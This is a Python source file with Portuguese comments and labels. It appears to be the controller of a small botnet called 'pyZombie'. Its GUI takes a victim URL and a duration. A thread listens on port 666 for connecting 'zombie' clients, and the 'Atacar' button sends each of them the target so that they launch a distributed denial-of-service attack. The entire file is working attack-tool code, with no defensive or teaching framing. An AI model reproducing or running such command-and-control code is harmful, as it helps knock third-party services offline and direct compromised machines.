# A interface gráfica não vai rodar bonitinha no Linux. To sem saco pra mecher no Frontend
# dessa joça, muda o treco ae ao seu gosto
from tkinter import *
import socket
import threading

class Application:
    def __init__(self, master=None):
        threading.Thread(target=self.inicia_socket).start()
        self.label = Label(root, text='Vitima')
        self.label.place(x=5, y=5)

        self.vitima = Entry(root, width='25')
        self.vitima.insert(0,'http://')
        self.vitima.place(x=8 ,y=30)

        self.label = Label(root, text='Tempo')
        self.label.place(x=80, y=60)

        self.tempo = Entry(root, width='5')
        self.tempo.insert(0,'60')
        self.tempo.place(x=128,y=60)

        self.BotaoAtacar = Button(root, text='Atacar', font=('Times New Roman', 20), command = self.atacar)
        self.BotaoAtacar.place(x=180, y = 10, width=100, height=70)

        
    def atacar(self):
        global lista
        if len(self.vitima.get()) == 7:
            messagebox.showinfo('Info', 'Informe a vitima')
        else:
            for x in lista:
                try:
                    dados = self.vitima.get() + '/|' + self.tempo.get()
                    x.send( dados.encode() )
                except:
                    x.close()
                    del x
                    
            messagebox.showinfo('Info', 'DoS iniciado, aguarde por ' + self.tempo.get() + ' segundos antes de iniciar um novo ataque')

    def inicia_socket(self):
        global lista
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('', 666))
        sock.listen(0)
        while True:
            client_socket, client_addr = sock.accept()
            lista.append(client_socket)

lista = []
root = Tk()
root.geometry('290x90')
root.resizable('False', 'False')
root.title('pyZombie, v0.1b')
Application(root)
root.mainloop()